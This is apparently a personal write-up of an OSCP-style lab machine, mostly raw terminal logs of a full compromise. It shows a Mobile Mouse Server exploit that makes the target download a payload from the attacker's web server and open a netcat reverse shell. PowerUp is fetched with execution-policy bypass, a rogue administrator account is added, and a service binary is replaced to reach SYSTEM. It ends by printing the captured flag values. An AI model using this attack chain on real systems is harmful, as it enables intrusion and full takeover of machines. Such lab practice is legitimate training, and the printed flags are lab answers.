SF:er\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r\n\
SF:r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\x20con
SF:tent=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x20BGCOL
SF:OR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-serif;\
SF:x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20>The\x2
SF:0server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive\x2
SF:0your\x20request\.</p></BODY></HTML>\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (87%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   37.52 ms 192.168.45.1
2   37.41 ms 192.168.45.254
3   37.55 ms 192.168.251.1
4   39.12 ms 192.168.162.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.02 seconds

From the nmap output, the machine is vulnerable to Mobile Mouse Server

The exploit in the exploitdb could not help https://www.exploit-db.com/exploits/51010

I used this to upload my payload and execute the exploit
https://github.com/KryoCeph/Mobile-Mouse-3.6.0.4-Exploit/blob/main/1-MMUpload.py
https://github.com/KryoCeph/Mobile-Mouse-3.6.0.4-Exploit/blob/main/2-MMExecute.py


──(kali㉿kali)-[~/oscpc]
└─$ python3 upload.py --target 192.168.162.155 --lhost 192.168.45.161 --file met.exe         
/home/kali/oscpc/upload.py:33: SyntaxWarning: invalid escape sequence '\{'
  download_string= f"curl http://{lhost}:8080/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
/home/kali/oscpc/upload.py:33: SyntaxWarning: invalid escape sequence '\W'
  download_string= f"curl http://{lhost}:8080/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
Downloading shell...

┌──(kali㉿kali)-[~/oscpc]
└─$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.162.155 - - [07/Dec/2024 19:16:25] "GET /met.exe HTTP/1.1" 200 -


┌──(kali㉿kali)-[~/oscpc]
└─$ python3 execute.py --target 192.168.162.155 --file met.exe                                 
/home/kali/oscpc/execute.py:30: SyntaxWarning: invalid escape sequence '\{'
  shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
/home/kali/oscpc/execute.py:30: SyntaxWarning: invalid escape sequence '\W'
  shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
Executing Uploaded shell...

└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.161] from (UNKNOWN) [192.168.162.155] 50206
Microsoft Windows [Version 10.0.19045.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Temp>whoami
whoami
oscp\tim

C:\Windows\Temp>hostname
hostname
oscp

C:\Windows\Temp>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::4d7c:4e6f:ebfe:b119%4
   IPv4 Address. . . . . . . . . . . : 192.168.162.155
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.162.254

C:\Windows\Temp>cd ..
cd ..

C:\Windows>cd ..

#For privilege escalation
I uploaded powerup.ps1

C:\Users\Tim>iwr -uri http://192.168.45.161:8080/PowerUp.ps1 -Outfile PowerUp.ps1
iwr -uri http://192.168.45.161:8080/PowerUp.ps1 -Outfile PowerUp.ps1
'iwr' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Tim>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Tim> iwr -uri http://192.168.45.161:8080/PowerUp.ps1 -Outfile PowerUp.ps1
iwr -uri http://192.168.45.161:8080/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\Tim> import-module .\PowerUp.ps1
import-module .\PowerUp.ps1
PS C:\Users\Tim> Invoke-AllChecks
Invoke-AllChecks


ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ServiceName                     : GPGOrchestrator
Path                            : "C:\Program Files\MilleGPG5\GPGService.exe"
ModifiableFile                  : C:\Program Files\MilleGPG5\GPGService.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'GPGOrchestrator'
CanRestart                      : True
Name                            : GPGOrchestrator
Check                           : Modifiable Service Files

ServiceName   : GPGOrchestrator
Path          : "C:\Program Files\MilleGPG5\GPGService.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'GPGOrchestrator'
CanRestart    : True
Name          : GPGOrchestrator
Check         : Modifiable Services

ModifiablePath    : C:\Users\Tim\AppData\Local\Microsoft\WindowsApps
IdentityReference : OSCP\Tim
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Tim\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\Tim\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Tim\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    : 
DefaultUserName      : Tim
DefaultPassword      : 
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 
Check                : Registry Autologons

It found that GPGOrchestrator has a modifiable path "C:\Program Files\MilleGPG5\GPGService.exe"
Based on the powerup output we can use the abuse function to add a new user john/password123! automatically
Just with this command <Invoke-ServiceAbuse -Name 'GPGOrchestrator'>

However, I did it but could not access the machine as john because their no rdp or winrm port open and I cannot use runas because it only work for GUI

PS C:\Users\Tim> Invoke-ServiceAbuse -Name 'GPGOrchestrator'
Invoke-ServiceAbuse -Name 'GPGOrchestrator'

ServiceAbused   Command                                                                   
-------------   -------                                                                   
GPGOrchestrator net user john Password123! /add && net localgroup Administrators john /add

PS C:\Users\Tim> Get-LocalGroupMember administrators
Get-LocalGroupMember administrators

ObjectClass Name               PrincipalSource
----------- ----               ---------------
User        OSCP\Administrator Local          
User        OSCP\john          Local          


I had to exploit the binary manually by replacing it with my met2.exe bianry to get a reverse shell.

PS C:\Users\Tim> mv met2.exe GPGService.exe
mv met2.exe GPGService.exe


PS C:\Program Files\MilleGPG5> mv  GPGService.exe  GPGService.exe2
mv  GPGService.exe  GPGService.exe2
PS C:\Program Files\MilleGPG5> ls
ls


    Directory: C:\Program Files\MilleGPG5


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/14/2022   2:55 AM                k-platform                                                           
d-----        11/14/2022   4:04 AM                log                                                                  
d-----        11/14/2022   2:52 AM                MariaDB                                                              
d-----        11/14/2022   2:53 AM                plugin                                                               
-a----         10/6/2022   7:39 AM       10022912 Analisi.dll                                                          
-a----         7/28/2022   3:00 AM       10898176 Engine.dll                                                           
-a----         10/6/2022   7:39 AM        5125504 GPGConnector.exe                                                     
-a----         10/6/2022   7:39 AM       13635968 GPGNetwork.exe                                                       
-a----         3/24/2021   3:33 AM       11227552 GPGService.exe2                                                      
-a----         10/6/2022   7:39 AM        9432064 InvioCloud.dll                                                       
-a----         10/6/2022   7:39 AM        9371136 InvioNetwork.dll                                                     
-a----         10/6/2022   7:39 AM       18179968 MilleGPG5.exe                                                        
-a----         10/6/2022   7:39 AM       13364608 MilleGPG5Patient.exe                                                 
-a----         10/6/2022   7:39 AM       67031040 Sincro.dll                                                           
-a----          3/5/2020   5:49 AM       12297456 TeamViewerQS.exe                                                     
-a----        11/14/2022   2:57 AM          78350 Uninstall.exe                                                        


 
PS C:\Program Files\MilleGPG5> cp C:\users\tim\GPGService.exe .
cp C:\users\tim\GPGService.exe .
PS C:\Program Files\MilleGPG5> ls
ls


    Directory: C:\Program Files\MilleGPG5


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/14/2022   2:55 AM                k-platform                                                           
d-----        11/14/2022   4:04 AM                log                                                                  
d-----        11/14/2022   2:52 AM                MariaDB                                                              
d-----        11/14/2022   2:53 AM                plugin                                                               
-a----         10/6/2022   7:39 AM       10022912 Analisi.dll                                                          
-a----         7/28/2022   3:00 AM       10898176 Engine.dll                                                           
-a----         10/6/2022   7:39 AM        5125504 GPGConnector.exe                                                     
-a----         10/6/2022   7:39 AM       13635968 GPGNetwork.exe                                                       
-a----         12/8/2024   3:58 AM           7168 GPGService.exe                                                       
-a----         3/24/2021   3:33 AM       11227552 GPGService.exe2                                                      
-a----         10/6/2022   7:39 AM        9432064 InvioCloud.dll                                                       
-a----         10/6/2022   7:39 AM        9371136 InvioNetwork.dll                                                     
-a----         10/6/2022   7:39 AM       18179968 MilleGPG5.exe                                                        
-a----         10/6/2022   7:39 AM       13364608 MilleGPG5Patient.exe                                                 
-a----         10/6/2022   7:39 AM       67031040 Sincro.dll                                                           
-a----          3/5/2020   5:49 AM       12297456 TeamViewerQS.exe                                                     
-a----        11/14/2022   2:57 AM          78350 Uninstall.exe                                                        


PS C:\Program Files\MilleGPG5> net stop GPGOrchestrator
net stop GPGOrchestrator
.
The GPG Orchestrator service was stopped successfully.

PS C:\Program Files\MilleGPG5> net start GPGOrchestrator
net start GPGOrchestrator
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.

PS C:\Program Files\MilleGPG5> 

┌──(kali㉿kali)-[~/oscpc]
└─$ nc -nvlp 444
listening on [any] 444 ...
connect to [192.168.45.161] from (UNKNOWN) [192.168.162.155] 52701
Microsoft Windows [Version 10.0.19045.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
oscp

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::4d7c:4e6f:ebfe:b119%4
   IPv4 Address. . . . . . . . . . . : 192.168.162.155
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.162.254

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd C:\users\administrator
cd C:\users\administrator

C:\Users\Administrator>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4CF3-17AD

 Directory of C:\Users\Administrator

11/14/2022  03:59 AM    <DIR>          .
11/14/2022  03:59 AM    <DIR>          ..
11/03/2022  11:52 AM    <DIR>          3D Objects
11/03/2022  11:52 AM    <DIR>          Contacts
11/14/2022  06:06 AM    <DIR>          Desktop
11/03/2022  11:52 AM    <DIR>          Documents
11/14/2022  04:34 AM    <DIR>          Downloads
11/03/2022  11:52 AM    <DIR>          Favorites
11/03/2022  11:52 AM    <DIR>          Links
11/03/2022  11:52 AM    <DIR>          Music
11/14/2022  04:40 AM    <DIR>          OneDrive
11/03/2022  11:55 AM    <DIR>          Pictures
11/14/2022  03:59 AM                17 query
11/03/2022  11:52 AM    <DIR>          Saved Games
11/03/2022  11:55 AM    <DIR>          Searches
11/03/2022  11:52 AM    <DIR>          Videos
               1 File(s)             17 bytes
              15 Dir(s)  25,328,050,176 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4CF3-17AD

 Directory of C:\Users\Administrator\Desktop

11/14/2022  06:06 AM    <DIR>          .
11/14/2022  06:06 AM    <DIR>          ..
12/08/2024  01:14 AM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  25,328,050,176 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
ba82796f87acf2d8e35aebfa9dbf1b8c

C:\Users\Administrator\Desktop>cd ..
cd ..

C:\Users\Administrator>cd ..
cd ..

C:\Users>cd tim
cd tim

C:\Users\Tim>cd Desktop
cd Desktop

C:\Users\Tim\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4CF3-17AD

 Directory of C:\Users\Tim\Desktop

11/14/2022  06:04 AM    <DIR>          .
11/14/2022  06:04 AM    <DIR>          ..
12/08/2024  01:14 AM                34 local.txt
11/14/2022  02:41 AM             2,348 Microsoft Edge.lnk
               2 File(s)          2,382 bytes
               2 Dir(s)  25,328,046,080 bytes free

C:\Users\Tim\Desktop>type local.txt
type local.txt
d7af8995e8a7aaa6c382c06ea3bd47ed

C:\Users\Tim\Desktop>
